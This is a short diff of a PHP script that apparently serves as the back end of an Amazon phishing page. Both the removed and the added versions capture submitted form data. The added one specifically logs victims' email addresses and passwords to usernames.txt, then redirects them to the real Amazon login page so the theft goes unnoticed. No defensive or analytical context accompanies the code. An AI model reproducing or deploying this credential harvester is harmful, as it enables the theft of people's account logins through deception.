@@ -1,13 +1,5 @@
-<?php
-header ('Location: https://www.amazon.com');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n\n");
-fclose($handle);
-exit;
+<?php 
+file_put_contents("usernames.txt", "Amazon Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
+header('Location: https://amazon.com/login');
+exit();
 ?>
